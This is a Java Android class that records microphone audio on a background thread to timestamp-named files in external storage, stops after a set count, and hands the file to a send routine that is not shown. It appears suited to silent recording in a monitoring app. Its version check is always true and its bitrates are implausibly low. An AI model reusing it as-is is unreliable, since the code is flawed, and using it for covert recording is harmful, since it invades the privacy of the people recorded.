package com.inet.android.audio;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;

import android.media.MediaRecorder;
import android.os.Build;
import android.os.Environment;

import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;

public final class RecordAudio {

	private static final int RECORDING_BITRATE = 44100;
	private static final int RECORDING_BITRATE_OLD = 8000;

	private MediaRecorder mMediaRecorder;
	private final String TAG = "RecordAudio";
	ConvertDate date;
	private static final String mPathName = "data";

	// Thread pool
	private ExecutorService mThreadPool;
	int minute;
	private AtomicBoolean mIsPlaying = new AtomicBoolean(false);
	private AtomicBoolean mIsRecording = new AtomicBoolean(false);
	String outputFileName;

	public RecordAudio(int minute) {
		Logging.doLog(TAG, " RecordAudio", " RecordAudio");
		mThreadPool = Executors.newCachedThreadPool();
		this.minute = minute;
	}

	public void createRecord(String fileName) {
		// reset any previous paused position
		String format = "";
		// initialise MediaRecorder
		if (mMediaRecorder == null) {
			mMediaRecorder = new MediaRecorder();
			mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);

			if (Build.VERSION.SDK_INT >= 16) {

				Logging.doLog(TAG, "Build.VERSION.SDK_INT >= 16");

				mMediaRecorder
						.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
				mMediaRecorder
						.setAudioEncoder(MediaRecorder.AudioEncoder.HE_AAC);
				mMediaRecorder.setAudioSamplingRate(RECORDING_BITRATE);
				mMediaRecorder.setAudioEncodingBitRate(32);
				format = ".aac";

			} else if (Build.VERSION.SDK_INT >= 10
					|| Build.VERSION.SDK_INT < 16) {

				Logging.doLog(TAG, "Build.VERSION.SDK_INT >= 10");

				mMediaRecorder
						.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
				mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
				mMediaRecorder.setAudioSamplingRate(RECORDING_BITRATE);
				mMediaRecorder.setAudioEncodingBitRate(48);
				format = ".aac";

			} else {
				mMediaRecorder
						.setAudioSource(MediaRecorder.AudioSource.DEFAULT);
				mMediaRecorder
						.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
				mMediaRecorder
						.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
				mMediaRecorder.setAudioSamplingRate(RECORDING_BITRATE_OLD);
				mMediaRecorder.setAudioEncodingBitRate(8);
				format = ".aac";

			}
			mMediaRecorder.setOnErrorListener(new RecorderErrorListener());
		} else {
			mMediaRecorder.stop();
			mMediaRecorder.reset();
		}

		mMediaRecorder.setOutputFile(fileName + format);
		try {
			mMediaRecorder.prepare();
			mMediaRecorder.start();
		} catch (IllegalStateException e) {
			Logging.doLog(TAG,
					"IllegalStateException thrown while trying to record a greeting");
			e.printStackTrace();
			mMediaRecorder.release();
			mMediaRecorder = null;
		} catch (IOException e) {
			Logging.doLog(TAG,
					"IOException thrown while trying to record a greeting");
			e.printStackTrace();
			mMediaRecorder.release();
			mMediaRecorder = null;
		}
	}

	public void executeRecording() {
		mThreadPool.execute(new Runnable() {

			@Override
			public void run() {
				outputFileName = getOutputFileName();
				if (outputFileName != null) {
					Logging.doLog(TAG, "record", "record");
					mIsPlaying.set(false);
					createRecord(outputFileName);
					mIsRecording.set(true);
					// launch tehe counter
					Logging.doLog(TAG, "mThreadPool.execute",
							"mThreadPool.execute");

					mThreadPool.execute(new RecordingCounterUpdater());
				}
			}
		});
	}

	private void executeStopRecording() {
		mThreadPool.execute(new Runnable() {

			@Override
			public void run() {
				if (mMediaRecorder != null) {
					stopRecording();
					mIsRecording.set(false);
				}

			}
		});

	}

	/**
	 * Creates and gets output file name
	 * 
	 * @return
	 */
	private String getOutputFileName() {
		date = new ConvertDate();
		// create media file
		String dir = Environment.getExternalStorageDirectory()
				.getAbsolutePath() + File.separator + mPathName;
		File filePath = new File(dir);
		if (!filePath.exists()) {
			filePath.mkdirs();
		}
		date.logTime();

		String file = dir + "/" + date.logTime();
		Logging.doLog(TAG, "file " + file, "file " + file);
		File audioFile = new File(file);
		try {
			if (!audioFile.exists()) {
				audioFile.createNewFile();
			}
		} catch (IOException e) {
			Logging.doLog(TAG, "Unable to create media file!");
			e.printStackTrace();
		}

		return audioFile.getAbsolutePath();
	}

	/**
	 * Updates duration counter while recording a message.
	 */
	private final class RecordingCounterUpdater implements Runnable {

		@Override
		public void run() {
			int currentCounter = 0;
			while (mIsRecording.get()) {
				postCounterUpdateMessage(currentCounter);
				try {
					Thread.sleep(1000);
				} catch (InterruptedException e) {
					// Re-assert the thread's interrupted status
					Thread.currentThread().interrupt();
					return;
				}
				currentCounter++;
			}

		}

	}

	/**
	 * Posts current position in the voice file to the Handler.
	 */
	private void postCounterUpdateMessage(int currentPosition) {
		Logging.doLog(TAG,
				String.format("posting counter update of:%d", currentPosition));
		if (currentPosition == minute) {
			Logging.doLog(TAG, "equals = " + minute);
			executeStopRecording();
		}
	}

	private void stopRecording() {
		if (mMediaRecorder != null) {
			Logging.doLog(TAG, "Stopping recording");
			mMediaRecorder.stop();
			mMediaRecorder.release();
			mMediaRecorder = null;
		}
	}
	
	public void SendAudio() {
		OperationWithAudio audio = new OperationWithAudio(this.outputFileName, this.minute);
		
	}

	/**
	 * Listener for the MediaRecorder error messages.
	 */
	public class RecorderErrorListener implements
			android.media.MediaRecorder.OnErrorListener {

		@Override
		public void onError(MediaRecorder mp, int what, int extra) {

			String whatDescription = "";

			switch (what) {
			case MediaRecorder.MEDIA_RECORDER_ERROR_UNKNOWN:
				whatDescription = "MEDIA_RECORDER_ERROR_UNKNOWN";
				break;
			default:
				whatDescription = Integer.toString(what);
				break;

			}

			Logging.doLog(TAG, String.format(
					"MediaRecorder error occured: %s,%d", whatDescription,
					extra));
		}

	}

}
